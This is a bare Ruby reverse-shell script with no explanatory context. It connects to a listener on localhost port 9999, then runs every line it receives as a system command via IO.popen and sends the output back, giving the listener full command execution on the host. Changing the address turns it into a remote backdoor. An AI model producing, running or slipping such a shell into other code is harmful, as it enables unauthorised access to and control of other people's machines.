#!/usr/bin/env ruby -wKU

require 'socket'

#socket = Socket.new(Socket::AF_INET, Socket::SOCK_STREAM)
#socket.connect(Socket.pack_sockaddr_in(9999, "localhost"))
socket = TCPSocket.new("localhost", 9999)

socket.print "shell\n"

while(cmd = socket.gets) do
	IO.popen(cmd, "r") do |io|
		socket.print "#{io.read}\n"
	end
	
	socket.print "$ "
end

socket.close
